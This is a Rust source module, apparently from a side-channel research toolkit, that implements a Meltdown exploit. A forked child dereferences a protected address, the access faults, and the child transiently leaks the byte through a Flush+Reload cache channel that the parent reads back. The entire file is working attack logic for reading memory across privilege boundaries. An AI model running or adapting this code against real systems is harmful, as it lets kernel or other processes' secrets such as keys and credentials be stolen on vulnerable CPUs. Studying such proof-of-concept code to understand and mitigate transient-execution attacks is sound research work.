use crate::fr::FlushReload;
use nix::sys::wait::waitpid;
use nix::unistd::{fork, ForkResult};

pub trait Meltdown {
    fn read(&self, addr: *const u8) -> Option<u8>;
}

pub struct MeltdownUS {
    channel: FlushReload,
}

impl Meltdown for MeltdownUS {
    fn read(&self, addr: *const u8) -> Option<u8> {
        match unsafe { fork() } {
            Ok(ForkResult::Child) => {
                self.channel.reset();

                let secret = unsafe { *addr }; // Will raise segfault
                self.channel.leak(secret); // Executed transiently
                std::process::exit(0);
            }
            Ok(ForkResult::Parent { child }) => {
                let _ = waitpid(child, None);
                self.channel.get()
            }
            Err(_) => None,
        }
    }
}

impl MeltdownUS {
    pub fn new() -> MeltdownUS {
        MeltdownUS {
            channel: FlushReload::new(),
        }
    }
}
